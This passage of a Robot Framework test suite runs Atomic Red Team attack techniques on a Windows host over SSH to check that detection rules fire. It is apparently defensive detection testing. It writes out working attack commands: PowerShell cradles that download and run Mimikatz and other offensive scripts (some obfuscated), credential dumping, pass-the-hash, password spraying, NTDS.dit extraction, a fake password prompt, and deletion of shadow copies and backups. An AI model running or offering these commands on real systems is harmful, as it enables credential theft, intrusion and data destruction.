   Should Be Equal  success  ${Status}
Get Responses of target_name XSL Script Processing_72
   [Documentation]  The responses of XSL Script Processing_1 Rule Name:--XSL Script Processing---pass-1/1
   [Tags]  Red Canary Atomic T1220 Defense Evasion, Execution
   ${cmd_name}   Set Variable  C:\\Windows\\Temp\\msxsl.exe C:\\Users\\Administrator\\Downloads\\atomic-red-team-master\\atomic-red-team-master\\atomic-red-team-master\\atomics\\T1220\\src\\msxslxmlfile.xml C:\\Users\\Administrator\\Downloads\\atomic-red-team-master\\atomic-red-team-master\\atomic-red-team-master\\atomics\\T1220\\src\\msxslscript.xsl
   ${target_n}   Set Variable  msxsl.exe
   do_ssh  ${windows_host_ip}  pass  ${cmd_name}
   ${Status}=  Loop over range_ten   @{range}  ${target_n}
   Should Be Equal  success  ${Status}
Get Responses of target_name XSL Script Processing_73
   [Documentation]  The responses of XSL Script Processing_2 Rule Name:--msxsl.exe Network--pass-1/1
   [Tags]  Red Canary Atomic T1220 Defense Evasion, Execution
   ${cmd_name}   Set Variable  C:\\Windows\\Temp\\msxsl.exe https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1220/src/msxslxmlfile.xml https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1220/src/msxslscript.xsl
   ${target_n}   Set Variable  SOCKET_CONNECT
   do_ssh  ${windows_host_ip}  pass  ${cmd_name}
   ${Status}=  Loop over range_ten   @{range}  ${target_n}
   Should Be Equal  success  ${Status}

Get Responses of target_name XSL Script Processing_74
   [Documentation]  The responses of XSL Script Processing_3 Rule Name:--XSL Script Processing -pass 2/2
   [Tags]  Red Canary Atomic T1220 Defense Evasion, Execution
   @{cmd_names}  Create List  wmic.exe process list /FORMAT: C:\\Users\\Administrator\\Downloads\\atomic-red-team-master\\atomic-red-team-master\\atomic-red-team-master\\atomics\\T1220\\src\\wmicscript.xsl  wmic.exe process list /FORMAT: https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1220/src/wmicscript.xs
   ${target_n}   Set Variable  /FORMAT
   Loop for do_ssh  @{cmd_names}
   ${Status}=  Loop over range_ten   @{range}  ${target_n}
   Should Be Equal  success  ${Status}

Get Responses of target_name Application Window Discovery_75
   [Documentation]  The responses of Application Window Discovery Rule Name:Application Window Discovery pass-1/1
   [Tags]  Red Canary Atomic T1010 Discovery
   ${cmd_names}  Set Variable  C:\\Windows\\Microsoft.NET\\Framework\\v4.0.30319\\csc.exe -out:T1010.exe C:\\Users\\Administrator\\Downloads\\atomic-red-team-master\\atomic-red-team-master\\atomic-red-team-master\\atomics\\T1010\\src\\T1010.cs
   ${target_n}   Set Variable  csc.exe
   do_ssh  ${windows_host_ip}  pass  ${cmd_names}
   ${Status}=  Loop over range_ten   @{range}  ${target_n}
   Should Be Equal  success  ${Status}

Get Responses of target_name Domain Trust Discovery_76
   [Documentation]  The responses of Domain Trust Discovery_1 Rule Name:Domain Trust Discovery-pass--1/1
   [Tags]  Red Canary Atomic T1482 Discovery
   ${cmd_names}   Set Variable  dsquery * -filter "(objectClass=trustedDomain)" -attr *
   ${target_n}   Set Variable  -filter
   do_ssh  ${windows_host_ip}  pass  ${cmd_names}
   ${Status}=  Loop over range_ten   @{range}  ${target_n}
   Should Be Equal  success  ${Status}

Get Responses of target_name Domain Trust Discovery_77
   [Documentation]  The responses of Security Software Discovery_2 Rule Name:Domain Trust Discovery-pass--1/1
   [Tags]  Red Canary Atomic T1482 Discovery
   ${cmd_names}   Set Variable  nltest /domain_trusts
   ${target_n}   Set Variable  nltest
   do_ssh  ${windows_host_ip}  pass  ${cmd_names}
   ${Status}=  Loop over range_ten   @{range}  ${target_n}
   Should Be Equal  success  ${Status}

Get Responses of target_name Security Software Discovery_78
   [Documentation]  The responses of  Security Software Discovery_1 Rule Name:Security Software Discovery--pass--1/1
   [Tags]  Red Canary Atomic T1063 Discovery
   @{cmd_names}   Create List  netsh.exe advfirewall firewall show all profiles  tasklist.exe  tasklist.exe | findstr /i virus  tasklist.exe | findstr /i cb  tasklist.exe | findstr /i defender  tasklist.exe | findstr /i cylance
   ${target_n}   Set Variable  tasklist.exe
   Loop for do_ssh   @{cmd_names}
   ${Status}=  Loop over range_ten   @{range}  ${target_n}
   Should Be Equal  success  ${Status}

Get Responses of target_name Security Software Discovery_79
   [Documentation]  The responses of  Security Software Discovery_2 Rule Name:Security Software Discovery--pass--1/1
   [Tags]  Red Canary Atomic T1063 Discovery
   ${cmd_names}  Set Variable  fltmc.exe | findstr.exe 385201
   ${target_n}   Set Variable  fltmc.exe
   do_ssh  ${windows_host_ip}  pass  ${cmd_names}
   ${Status}=  Loop over range_ten   @{range}  ${target_n}
   Should Be Equal  success  ${Status}
Get Responses of target_name System Information Discovery_80
   [Documentation]  The responses of  System Information Discovery Rule Name:System Information Discovery--pass-1/1
   [Tags]  Red Canary Atomic T1082 Discovery
   @{cmd_names}  Create List  systeminfo  reg query HKLM\\SYSTEM\\CurrentControlSet\\Services\\Disk\\Enum
   ${target_n}   Set Variable  reg query
   Loop for do_ssh  @{cmd_names}
   ${Status}=  Loop over range_ten   @{range}  ${target_n}
   Should Be Equal  success  ${Status}
Get Responses of target_name System Network Configuration Discovery_81
   [Documentation]  The responses of  System Network Configuration Discovery-->Rule Name:System Network Configuration Discovery--pass-1/1
   [Tags]  Red Canary Atomic T1016 Discovery
   @{cmd_names}  Create List  ipconfig /all  netsh interface show  arp -a  nbtstat -n  net config
   ${target_n}   Set Variable  netsh
   Loop for do_ssh   @{cmd_names}
   ${Status}=  Loop over range_ten   @{range}  ${target_n}
   Should Be Equal  success  ${Status}
Get Responses of target_name System Network Connections Discovery_82
   [Documentation]  The responses of  System Network Connections Discovery-->Rule Name:System Network Configuration Discovery--pass1/1
   [Tags]  Red Canary Atomic T1016 Discovery
   ${cmd_names}  Create List  netstat  net use  net sessions
   ${target_n}   Set Variable  net.exe
   Loop for do_ssh  ${windows_host_ip}  pass  @{cmd_names}
   ${Status}=  Loop over range_ten   @{range}  ${target_n}
   Should Be Equal  success  ${Status}
Get Responses of target_name System Service Discovery_83
   [Documentation]  The responses of System Service Discovery_1 Rule Name:Service Stop and Security Software Discovery--pass--1/1
   [Tags]  Red Canary Atomic T1007 Discovery
   @{cmd_names}  Create List  tasklist.exe  sc query  sc query state= all  sc start svchost.exe  sc stop svchost.exe  wmic service where (displayname like "svchost.exe") get name
   ${target_n}   Set Variable  sc.exe
   Loop for do_ssh  @{cmd_names}
   ${Status}=  Loop over range_ten   @{range}  ${target_n}
   Should Be Equal  success  ${Status}
Get Responses of target_name System Service Discovery_84
   [Documentation]  The responses of System Service Discovery_2 Rule Name:System Network Configuration Discovery--pass 1/1
   [Tags]  Red Canary Atomic T1007 Discovery
   ${cmd_names}  Set Variable  net.exe start >> C:\\Windows\\Temp\\service-list.txt
   ${target_n}   Set Variable  start
   do_ssh  ${windows_host_ip}  pass  ${cmd_names}
   ${Status}=  Loop over range_ten   @{range}  ${target_n}
   Should Be Equal  success  ${Status}
Get Responses of target_name System Time Discovery_85
   [Documentation]  The responses of System Time Discovery Rule Name:System Network Configuration Discovery--pass1/1
   [Tags]  Red Canary Atomic T1124 Discovery
   @{cmd_names}  CreateList  net time \\computer1 w32tm /tz
   ${target_n}   Set Variable  time
   Loop for do_ssh  ${windows_host_ip}  pass  @{cmd_names}
   ${Status}=  Loop over range_ten   @{range}  ${target_n}
   Should Be Equal  success  ${Status}

Get Responses of target_name Brute Force_86
   [Documentation]  The responses of Brute Force Rule Name: System Network Configuration Discovery and Net.exe Execution--pass 1/1
   [Tags]  Red Canary Atomic T1110 Credential Access
   @{cmd_names}  CreateList  net user /domain > DomainUsers.txt  echo "Password1" >> passwords.txt  echo "1q2w3e4r">> passwords.txt  echo "Password!" >> passwords.txt  @FOR /F %n in (DomainUsers.txt) DO @FOR /F %p in (passwords.txt) DO @net use \COMPANYDC1\IPC$ /user:private\%n %p 1>NUL 2>&1 && @echo [*] %n:%p && @net use /delete \COMPANYDC1\IPC$ > NUL
   ${target_n}   Set Variable  net use
   Loop for do_ssh  @{cmd_names}
   ${Status}=  Loop over range_ten   @{range}  ${target_n}
   Should Be Equal  success  ${Status}
Get Responses of target_name Credential Dump_87
   [Documentation]  The responses of Powershell Mimikatz Rule Name: Mimikatz Use and PowerShell Download from URL--pass-1/1
   [Tags]  Red Canary Atomic T1003 Credential Access
   ${cmd_names}  Set Variable  powershell.exe IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/EmpireProject/Empire/dev/data/module_source/credentials/Invoke-Mimikatz.ps1'); Invoke-Mimikatz -DumpCr
   ${target_n}   Set Variable  Invoke-Mimikatz
   do_ssh  ${windows_host_ip}  pass  ${cmd_names}
   ${Status}=  Loop over range_ten   @{range}  ${target_n}
   Should Be Equal  success  ${Status}
Get Responses of target_name System Credential Dump_88
   [Documentation]  The responses of Windows Credential Editor Rule Name:Credential Dumping--pass-1/1
   [Tags]  Red Canary Atomic T1003 Discovery
   ${cmd_names}  Set Variable  wce.exe -o output.txt
   ${target_n}   Set Variable  output.txt
   do_ssh  ${windows_host_ip}  pass  ${cmd_names}
   ${Status}=  Loop over range_ten   @{range}  ${target_n}
  Should Be Equal  success  ${Status}
Get Responses of target_name System Credential Dump_89
   [Documentation]  The responses of Offline Credential Theft With Mimikatz Rule Name:Mimikatz Use--pass 1/1
   [Tags]  Red Canary Atomic T1003 Discovery
   @{cmd_names}  Create List  mimikatz  sekurlsa::minidump lsass_dump.dmp  sekurlsa::logonpasswords full
   ${target_n}   Set Variable  mimikatz.exe
   Loop for do_ssh  @{cmd_names}
   ${Status}=  Loop over range_ten  @{range}  ${target_n}
   Should Be Equal  success  ${Status}
Get Responses of target_name System Credential Dump_90
   [Documentation]  The responses of Create Volume Shadow Copy with NTDS.dit Rule Name:Activity Related to NTDS.dit Domain Hash Retrieval--pass--1/1
   [Tags]  Red Canary Atomic T1003 Discovery
   ${cmd_names}  Set Variable  vssadmin.exe create shadow /for=c:
   ${target_n}   Set Variable  vssadmin.exe
   do_ssh  ${windows_host_ip}  pass@  ${cmd_names}
   ${Status}=  Loop over range_ten   @{range}  ${target_n}
   Should Be Equal  success  ${Status}
Get Responses of target_name System Credential Dump_91
   [Documentation]  The responses of Copy NTDS.dit from Volume Shadow Copy Rule Name:Export Registry Hives--pass-1/1
   [Tags]  Red Canary Atomic T1003 Discovery
   @{cmd_names}  Create List  copy \\?\\GLOBALROOT\\Device\\HarddiskVolumeShadowCopy1\\Windows\\NTDS\\NTDS.ditC:\\Extract\\ntds.dit  copy \\?\\GLOBALROOT\\Device\\HarddiskVolumeShadowCopy1\\Windows\\System32\\config\\SYSTEM C:\\Extract\\VSC_SYSTEM_HIVE  reg save HKLM\\SYSTEM C:\\Extract\\SYSTEM_HIVE
   ${target_n}   Set Variable  \?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1
   Loop for do_ssh  @{cmd_names}
   ${Status}=  Loop over range_ten   @{range}  ${target_n}
   Should Be Equal  success  ${Status}
Get Responses of target_name Credentials in Files_92
   [Documentation]  The responses of Runs Mimikatz & Mimikittenz by name  Rule Name:Mimikatz Use--pass 1/1
   [Tags]  Red Canary Atomic T1081 Credential Access
   @{cmd_names}  Create List  powershell.exe invoke-mimikittenz  powershell.exe mimikatz.exe
   ${target_n}   Set Variable  mimikatz.exe
   Loop for do_ssh   @{cmd_names}
   ${Status}=  Loop over range_ten   @{range}  ${target_n}
   Should Be Equal  success  ${Status}
Get Responses of target_name Credentials in Registry_93
   [Documentation]  The responses of Enumeration for Credentials in Registry Rule Name:Credentials in Registry--pass--1/1
   [Tags]  Red Canary Atomic T1214 Credential Access
   @{cmd_names}  Create List  reg query HKLM /f password /t REG_SZ /s  reg query HKCU /f password /t REG_SZ /s
   ${target_n}   Set Variable  reg.exe
   Loop for do_ssh   @{cmd_names}
   ${Status}=  Loop over range_ten   @{range}  ${target_n}
   Should Be Equal  success  ${Status}
Get Responses of target_name Input Prompt _94
   [Documentation]  The responses of PowerShell - Prompt User for Password --not done  yet
   [Tags]  Red Canary Atomic T1141 Credential Access
   ${cmd_names}  Set Variable  powershell.exe -command {$cred = $host.UI.PromptForCredential('Windows Security Update', '',[Environment]::UserName, [Environment]::UserDomainName); echo $cred.GetNetworkCredential().Password;}
   ${target_n}   Set Variable  PromptForCredential
   do_ssh   ${windows_host_ip}  pass  ${cmd_names}
   ${Status}=  Loop over range_ten   @{range}  ${target_n}
   Should Be Equal  success  ${Status}
Get Responses of target_name InstallUtil_95
   [Documentation]  The responses of InstallUtil uninstall method call Rule Name:Possible Applocker Bypass--pass1/1
   [Tags]  Red Canary Atomic T1118 Defense Evasion, Execution
   @{cmd_names}  Create List  C:\\Windows\\Microsoft.NET\\Framework\\v4.0.30319\\csc.exe /target:library /out:C:\\Users\\Administrator\\Downloads\\atomic-red-team-master\\atomic-red-team-master\\atomic-red-team-master\\atomics\T1118\src\T1118.dll C:\\Users\\Administrator\\Downloads\\atomic-red-team-master\\atomic-red-team-master\\atomic-red-team-master\\atomics\T1118\src\T1118.cs  C:\\Windows\\Microsoft.NET\\Framework\\v4.0.30319\\InstallUtil.exe /logfile= /LogToConsole=false /U C:\\Users\\Administrator\\Downloads\\atomic-red-team-master\\atomic-red-team-master\\atomic-red-team-master\\atomics\T1118\src\T1118.dll
   ${target_n}   Set Variable  InstallUtil.exe
   Loop for do_ssh  @{cmd_names}
   ${Status}=  Loop over range_ten   @{range}  ${target_n}
   Should Be Equal  success  ${Status}
Get Responses of target_name Powershell _96
   [Documentation]  The responses of Mimikatz_1 Rule Name:Mimikatz UseMimikatz Use--pass--1
   [Tags]  Red Canary Atomic T1086  Execution
   ${cmd_names}  Set Variable  powershell.exe "IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/mattifestation/PowerSploit/master/Exfiltration/Invoke-Mimikatz.ps1'); Invoke-Mimikatz -DumpCreds"
   ${target_n}   Set Variable  Mimikatz
   do_ssh  ${windows_host_ip}  pass  ${cmd_names}
   ${Status}=  Loop over range_ten   @{range}  ${target_n}
   Should Be Equal  success  ${Status}
Get Responses of target_name Powershell _97
   [Documentation]  The responses of BloodHound & Invoke-AppPathBypass_2 Rule Name:PowerShell Download from URL--pass--2/2
   [Tags]  Red Canary Atomic T1086  Execution
   @{cmd_names}  Create List   powershell.exe "IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/BloodHoundAD/BloodHound/master/Ingestors/SharpHound.ps1'); Invoke-BloodHound"  Powershell.exe "IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/enigma0x3/Misc-PowerShell-Stuff/master/Invoke-AppPathBypass.ps1'); Invoke-AppPathBypass -Payload 'C:\Windows\System32\cmd.exe'"
   ${target_n}   Set Variable  New-Object Net.WebClient).DownloadString(
   Loop for do_ssh  @{cmd_names}
   ${Status}=  Loop over range_ten   @{range}  ${target_n}
   Should Be Equal  success  ${Status}
Get Responses of target_name Powershell _98
   [Documentation]  The responses of Obfuscation Tests_3 Rule Name:PowerShell Download from URL--pass--1/1
   [Tags]  Red Canary Atomic T1086  Execution
   @{cmd_names}  Create List  powershell.exe (New-Object Net.WebClient).DownloadFile('http://bit.ly/L3g1tCrad1e','Default_File_Path.ps1');IEX((-Join([IO.File]::ReadAllBytes('Default_File_Path.ps1')|ForEach-Object{[Char]$_})))  powershell.exe (New-Object Net.WebClient).DownloadFile('http://bit.ly/L3g1tCrad1e','Default_File_Path.ps1');[ScriptBlock]::Create((-Join([IO.File]::ReadAllBytes('Default_File_Path.ps1')|ForEach-Object{[Char]$_}))).InvokeReturnAsIs()  Set-Variable HJ1 'http://bit.ly/L3g1tCrad1e';SI Variable:/0W 'Net.WebClient';Set-Item Variable:\gH 'Default_File_Path.ps1';ls _-*;Set-Variable igZ (.$ExecutionContext.InvokeCommand.(($ExecutionContext.InvokeCommand.PsObject.Methods|?{$_.Name-like'*Cm*t'}).Name).Invoke($ExecutionContext.InvokeCommand.(($ExecutionContext.InvokeCommand|GM|?{$_.Name-like'*om*e'}).Name).Invoke('*w-*ct',$TRUE,1))(Get-ChildItem Variable:0W).Value);Set-Variable J ((((Get-Variable igZ -ValueOn)|GM)|?{$_.Name-like'*w*i*le'}).Name);(Get-Variable igZ -ValueOn).((ChildItem Variable:J).Value).Invoke((Get-Item Variable:/HJ1).Value,(GV gH).Value);&( ''.IsNormalized.ToString()[13,15,48]-Join'')(-Join([Char[]](CAT -Enco 3 (GV gH).Value)))
   ${target_n}   Set Variable  bit.ly/L3g1tCrad1
   Loop for do_ssh  @{cmd_names}
   ${Status}=  Loop over range_ten   @{range}  ${target_n}
   Should Be Equal  success  ${Status}
Get Responses of target_name Powershell _99
   [Documentation]  The responses of Mimikatz - Cradlecraft PsSendKeys_4 Rule Name: Mimikatz - Cradlecraft PsSendKeys--pass--1/1
   [Tags]  Red Canary Atomic T1086  Execution
   ${cmd_names}  Set Variable  powershell.exe $url='https://raw.githubusercontent.com/mattifestation/PowerSploit/master/Exfiltration/Invoke-Mimikatz.ps1';$wshell=New-Object -ComObject WScript.Shell;$reg='HKCU:\Software\Microsoft\Notepad';$app='Notepad';$props=(Get-ItemProperty $reg);[Void][System.Reflection.Assembly]::LoadWithPartialName('System.Windows.Forms');@(@('iWindowPosY',([String]([System.Windows.Forms.Screen]::AllScreens)).Split('}')[0].Split('=')[5]),@('StatusBar',0))|ForEach{SP $reg (Item Variable:_).Value[0] (Variable _).Value[1]};$curpid=$wshell.Exec($app).ProcessID;While(!($title=GPS|?{(Item Variable:_).Value.id-ieq$curpid}|ForEach{(Variable _).Value.MainWindowTitle})){Start-Sleep -Milliseconds 500};While(!$wshell.AppActivate($title)){Start-Sleep -Milliseconds 500};$wshell.SendKeys('^o');Start-Sleep -Milliseconds 500;@($url,(' '*1000),'~')|ForEach{$wshell.SendKeys((Variable _).Value)};$res=$Null;While($res.Length -lt 2){[Windows.Forms.Clipboard]::Clear();@('^a','^c')|ForEach{$wshell.SendKeys((Item Variable:_).Value)};Start-Sleep -Milliseconds 500;$res=([Windows.Forms.Clipboard]::GetText())};[Windows.Forms.Clipboard]::Clear();@('%f','x')|ForEach{$wshell.SendKeys((Variable _).Value)};If(GPS|?{(Item Variable:_).Value.id-ieq$curpid}){@('{TAB}','~')|ForEach{$wshell.SendKeys((Item Variable:_).Value)}};@('iWindowPosDY','iWindowPosDX','iWindowPosY','iWindowPosX','StatusBar')|ForEach{SP $reg (Item Variable:_).Value $props.((Variable _).Value)};IEX($res);invoke-mimikatz -dumpcr
   ${target_n}   Set Variable  New-Object -ComObject WScript.Shell
   do_ssh  ${windows_host_ip}  pass  ${cmd_names}
   ${Status}=  Loop over range_ten   @{range}  ${target_n}
   Should Be Equal  success  ${Status}
Get Responses of target_name Powershell _100
   [Documentation]  The responses of Powershell MsXml COM object - no prompt &  XML requests _5 Rule Name:Mimikatz - Cradlecraft PsSendKeys--pass--2/2
   [Tags]  Red Canary Atomic T1086  Execution
   @{cmd_names}  Create List  powershell.exe IEX -exec bypass -windowstyle hidden -noprofile "$comMsXml=New-Object -ComObject MsXml2.ServerXmlHttp;$comMsXml.Open('GET','https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1086/payloads/test.ps1',$False);$comMsXml.Send();IEX $comMsXml.ResponseText"  "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe" -exec bypass -windowstyle hidden -noprofile "$Xml = (New-Object System.Xml.XmlDocument);$Xml.Load('https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1086/payloads/test.xml}');$Xml.command.a.execute | IEX"
   ${target_n}   Set Variable  bypass -windowstyle hidden -noprofile
   Loop for do_ssh  @{cmd_names}
   ${Status}=  Loop over range_ten   @{range}  ${target_n}
   Should Be Equal  success  ${Status}
Get Responses of target_name Powershell _101
   [Documentation]  The responses of Powershell MsXml COM object with prompt_6 Rule Name: Mimikatz - Cradlecraft PsSendKeys--pass--1/1
   [Tags]  Red Canary Atomic T1086  Execution
   ${cmd_names}  Set Variable  powershell.exe -exec bypass -noprofile "$comMsXml=New-Object -ComObject MsXml2.ServerXmlHttp;$comMsXml.Open('GET','https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1086/payloads/test.ps1',$False);$comMsXml.Send();IEX $comMsXml.ResponseText"
   ${target_n}   Set Variable  exec bypass -noprofile
   do_ssh  ${windows_host_ip}  pass  ${cmd_names}
   ${Status}=  Loop over range_ten   @{range}  ${target_n}
   Should Be Equal  success  ${Status}
Get Responses of target_name Powershell _102
   [Documentation]  The responses of Powershell invoke mshta.exe download_7 Rule NAME:Suspicious Rundll32 Activity--PASS--1/1
   [Tags]  Red Canary Atomic T1086  Execution
   ${cmd_names}  Set Variable  powershell.exe "C:\Windows\system32\cmd.exe" /c "mshta.exe javascript:a=GetObject('script:https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1086/payloads/mshta.sct').Exec();close()"
   ${target_n}   Set Variable  mshta.exe
   do_ssh  ${windows_host_ip}  pass  ${cmd_names}
   ${Status}=  Loop over range_ten   @{range}  ${target_n}
   Should Be Equal  success  ${Status}
Get Responses of target_name Powershell _103
   [Documentation]  The responses of PowerShell Fileless Script Execution_8 Rule Name: Mimikatz - Cradlecraft PsSendKeys--pass--1/1
   [Tags]  Red Canary Atomic T1086  Execution
   @{cmd_names}  Create List  "Set-Content -path "$env:SystemRoot//Temp//art-marker.txt" -value "Hello from the Atomic Red Team""  reg.exe add "HKEY_CURRENT_USER\\Software\\Classes\\AtomicRedTeam" /v ART /t REG_SZ /d "U2V0LUNvbnRlbnQgLXBhdGggIiRlbnY6U3lzdGVtUm9vdC9UZW1wL2FydC1tYXJrZXIudHh0IiAtdmFsdWUgIkhlbGxvIGZyb20gdGhlIEF0b21pYyBSZWQgVGVhbSI="  powershell.exe -noprofile -windowstyle hidden -executionpolicy bypass iex ([Text.Encoding]::ASCII.GetString([Convert]::FromBase64String((gp 'HKCU:\\Software\\Classes\\AtomicRedTeam').ART)))  del /Q /F %SystemRoot%\\Temp\\art-marker.txt  REG DELETE "HKEY_CURRENT_USER\\Software\\Classes\\AtomicRedTeam" /f
   ${target_n}   Set Variable  -noprofile -windowstyle hidden
   Loop for do_ssh   @{cmd_names}
   ${Status}=  Loop over range_ten   @{range}  ${target_n}
   Should Be Equal  success  ${Status}
Get Responses of target_name Service Execution_104
   [Documentation]  The responses of Execute a Command as a Service Rule Name:Service stop --pass/1/1
   [Tags]  Red Canary Atomic T1035 Execution
   @{cmd_names}  Create List  sc.exe create ARTService binPath=%COMSPEC% /c powershell.exe -nop -w hidden -command New-Item -ItemType File C:\art-marker.txt  sc.exe start ARTService  sc.exe delete ARTService
   ${target_n}   Set Variable  sc.exe
   Loop for do_ssh     @{cmd_names}
   ${Status}=  Loop over range_ten   @{range}  ${target_n}
   Should Be Equal  success  ${Status}
Get Responses of target_name Windows Management Instrumentation_105
   [Documentation]  The responses of  WMI Reconnaissance Rule Name:Windows Management Instrumentation-pass--4/4
   [Tags]  Red Canary Atomic T1047 Execution,Lateral Movement
   @{cmd_names}  Create List  wmic useraccount get /ALL  wmic process get caption,executablepath,commandline  wmic qfe get description,installedOn /format:csv  wmic /node:"13.126.100.15" service where (caption like "%sql server (%")
   ${target_n}   Set Variable  wmic.exe
   Loop for do_ssh   @{cmd_names}
   ${Status}=  Loop over range_ten   @{range}  ${target_n}
   Should Be Equal  success  ${Status}
Get Responses of target_name Pass the Hash_106
   [Documentation]  The responses of Mimikatz Pass the Hash Rule Name:Mimikatz Use and Suspicious Process Creation-->pass--1/1
   [Tags]  Red Canary Atomic T1075 Lateral Movement
   ${cmd_name}  Set Variable  mimikatz # sekurlsa::pth /user:Administrator /domain:atomic.local /ntlm:cc36cf7a8514893efccd3324464tkg1a
   ${target_n}   Set Variable  mimikatz.exe
   do_ssh   ${windows_host_ip}  pass  ${cmd_name}
   ${Status}=  Loop over range_ten   @{range}  ${target_n}
   Should Be Equal  success  ${Status}
Get Responses of target_name Remot Desktop Protocol_107
   [Documentation]  The responses of RDP Rule Name:System Network Configuration Discovery,Suspicious TSCON Start and service stop--pass--1/1
   [Tags]  Red Canary Atomic T1076  Lateral Movement
   @{cmd_name}  Create List  query user  sc.exe create sesshijack binpath= "cmd.exe /k tscon 1337 /dest:rdp-tcp#55"  net start sesshijack  sc.exe delete sesshijack
   ${target_n}   Set Variable  delete
   Loop for do_ssh  @{cmd_name}
   ${Status}=  Loop over range_ten   @{range}  ${target_n}
   Should Be Equal  success  ${Status}
Get Responses of target_name Standard Application Protocol_108
   [Documentation]  The responses of  Malicious User Agents
   [Tags]  Red Canary Atomic T1071  Command And Control
   @{cmd_name}  Create List  powershell.exe Invoke-WebRequest www.google.com -UserAgent "HttpBrowser/1.0" | out-null  powershell.exe Invoke-WebRequest  www.google.com -UserAgent "Wget/1.9+cvs-stable (Red Hat modified)" | out-null  powershell.exe Invoke-WebRequest www.google.com -UserAgent "Opera/8.81 (Windows NT 6.0; U; en)" | out-null  powershell.exe Invoke-WebRequest www.google.com -UserAgent "*<|>*" | out-null
   ${target_n}  Set Variable  powershell.exe
   Loop for do_ssh  @{cmd_name}
   ${Status}=  Loop over range_ten   @{range}  ${target_n}
   Should Be Equal  success  ${Status}
Get Responses of target_name Uncommonly Used Port_109
   [Documentation]  The responses of  Testing usage of uncommonly used port with PowerShell
   [Tags]  Red Canary Atomic T1065  Command And Control
   ${cmd_name}  Set Variable  powershell.exe test-netconnection -ComputerName www.google.com -port 8081
   ${target_n}  Set Variable  powershell.exe
    do_ssh  ${windows_host_ip}  pass  ${cmd_name}
   ${Status}=  Loop over range_ten   @{range}  ${target_n}
   Should Be Equal  success  ${Status}
Get Responses of target_name Data Destruction_110
   [Documentation]  The responses of Windows - Delete Volume Shadow Copies_1
   [Tags]  Red Canary Atomic T1485  Impact
   ${cmd_name}  Set Variable  vssadmin.exe delete shadows /all /quiet
   ${target_n}  Set Variable  vssadmin.exe
    do_ssh  ${windows_host_ip}  pass  ${cmd_name}
   ${Status}=  Loop over range_ten   @{range}  ${target_n}
   Should Be Equal  success  ${Status}
Get Responses of target_name Data Destruction_111
   [Documentation]  The responses of Windows - Delete Windows Backup Catalog_2
   [Tags]  Red Canary Atomic T1485  Impact
   ${cmd_name}  Set Variable  wbadmin delete catalog -quiet
   ${target_n}  Set Variable  catalog
   do_ssh  ${windows_host_ip}  pass  ${cmd_name}
   ${Status}=  Loop over range_ten   @{range}  ${target_n}
   Should Be Equal  success  ${Status}
Get Responses of target_name Data Destruction_112
   [Documentation]  The responses of Windows - Disable Windows Recovery Console Repair_3
   [Tags]  Red Canary Atomic T1485  Impact
   @{cmd_names}  Create List  bcdedit.exe /set {default} bootstatuspolicy ignoreallfailures  bcdedit.exe /set {default} recoveryenabled no
   ${target_n}  Set Variable  bcdedit.exe
   Loop for do_ssh  @{cmd_names}
   ${Status}=  Loop over range_ten   @{range}  ${target_n}
   Should Be Equal  success  ${Status}
Get Responses of target_name Data Destruction_113
   [Documentation]  The responses of Windows - Overwrite file with Sysinternals SDelete_4 Rule Name:Secure Deletion with SDelete
   [Tags]  Red Canary Atomic T1485  Impact
   ${cmd_name}  Set Variable  sdelete.exe C:\\Users\\Administrator\\Pictures\\jatfile.jar
   ${target_n}  Set Variable  sdelete
   do_ssh  ${windows_host_ip}  pass  ${cmd_name}
   ${Status}=  Loop over range_ten   @{range}  ${target_n}
   Should Be Equal  success  ${Status}

Get Responses of target_name Inhibit System Recovery_114
   [Documentation]  The responses of Windows - Delete Volume Shadow Copies_1 Rule Name:Catalog Deletion with wbadmin.exe
   [Tags]  Red Canary Atomic T1490  Impact
   ${cmd_name}  Set Variable  vssadmin.exe delete shadows /all /quiet
   ${target_n}  Set Variable  delete
    do_ssh  ${windows_host_ip}  pass  ${cmd_name}
   ${Status}=  Loop over range_ten   @{range}  ${target_n}
   Should Be Equal  success  ${Status}
Get Responses of target_name Inhibit System Recovery_115
   [Documentation]  The responses of Windows - Delete Volume Shadow Copies via WMI_2 Rule Name:Catalog Deletion with wbadmin.exe
   [Tags]  Red Canary Atomic T1490  Impact
   ${cmd_name}  Set Variable  wmic.exe shadowcopy  delete
   ${target_n}  Set Variable delete
   do_ssh  ${windows_host_ip}  pass  ${cmd_name}
   ${Status}=  Loop over range_ten   @{range}  ${target_n}
   Should Be Equal  success  ${Status}
Get Responses of target_name Inhibit System Recovery_116
   [Documentation]  The responses of Windows - Delete Windows Backup Catalog_3 Rule Name:Catalog Deletion with wbadmin.exe--fail-1/1
   [Tags]  Red Canary Atomic T1490  Impact
   ${cmd_name}  Set Variable  wbadmin delete catalog -quiet
   ${target_n}  Set Variable  catalog
   do_ssh  ${windows_host_ip}  pass  ${cmd_name}
   ${Status}=  Loop over range_ten   @{range}  ${target_n}
   Should Be Equal  success  ${Status}
Get Responses of target_name Inhibit System Recovery_117
   [Documentation]  The responses of Windows - Disable Windows Recovery Console Repair_3 Rule Name:BCDEDIT CHECKING--pass-1/1
   [Tags]  Red Canary Atomic T1490  Impact
   @{cmd_names}  Create List  bcdedit.exe /set {default} bootstatuspolicy ignoreallfailures  bcdedit.exe /set {default} recoveryenabled no
   ${target_n}  Set Variable  bcdedit.exe
   Loop for do_ssh  @{cmd_names}
   ${Status}=  Loop over range_ten   @{range}  ${target_n}
   Should Be Equal  success  ${Status}
Get Responses of target_name Service Stop_118
   [Documentation]  The responses of  Windows - Stop service using Service Controller_1 Rule Name:service stop --pass-1/1
   [Tags]  Red Canary Atomic T1489  Impact
   ${cmd_names}  Set Variable  sc.exe stop spooler
   ${target_n}  Set Variable  sc.exe
   do_ssh  ${windows_host_ip}  pass  ${cmd_names}
